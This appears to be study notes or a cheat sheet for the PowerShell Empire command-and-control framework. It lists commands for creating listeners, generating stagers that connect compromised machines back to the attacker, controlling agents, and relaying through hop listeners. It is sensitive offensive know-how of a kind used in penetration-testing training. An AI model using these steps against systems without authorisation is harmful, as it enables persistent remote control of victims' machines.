# POWERSHELL EMPIRE C2 FRAMEWORK 

## LISTENERS

### Listeners in Empire are used to receive connections from stagers.  The default listener is the HTTP listener. This is what we will be using here, although there are many others available. It's worth noting that a single listener can be used more than once -- they do not die after their first usage.

#### Listener selection: uselistener LISTENER

#### Listener options: options, set OPTION VALUE, set Name NAME, set Host OUR_IP, set Port OUR_PORT

#### Launch listener: execute

#### Stop listener: kill LISTENER_NAME

#### Exit out of this menu: back, Main menu: main

## STAGERS

###  Stagers are Empire's payloads. They are used to connect back to waiting listeners, creating an agent when executed.

### We can generate stagers in either Empire CLI or Starkiller. In most cases these will be given as script files to be uploaded to the target and executed. Empire gives us a huge range of options for creating and obfuscating stagers for AV evasion; however, we will not be going into a lot of detail about these here.

#### Stager generation: usestager (Include space to get a list of available stagers in a dropdown menu)

#### General purpose stager: multi/launcher

#### Specify stager: usestager multi/launcher

#### Stager options: options, set OPTION VALUE set Listener LISTENER_NAME, execute

## AGENTS

#### Agent setup: Copy and paste stager to a script (name of your choice) and then transfer it on to the machine. Or just copy/paste the entire script to compromised machine to connect to the C2 server.

#### Agent interaction: agents (See full list of available agents), interact AGENT_NAME then help (Check your options to execute on compromised machine)

#### Switch back to agents menu: back

#### Kill agent: kill AGENT_NAME

#### Rename agent: rename AGENT_NAME NEW_AGENT_NAME

## HOP LISTENERS

### Hop Listeners create what looks like a regular listener in our list of listeners (like the http listener we used before); however, rather than opening a port to receive a connection, hop listeners create files to be copied across to the compromised "jump" server and served from there. These files contain instructions to connect back to a normal (usually HTTP) listener on our attacking machine. As such, the hop listener in the listeners menu can be thought of as more of a placeholder -- a reference to be used when generating stagers.

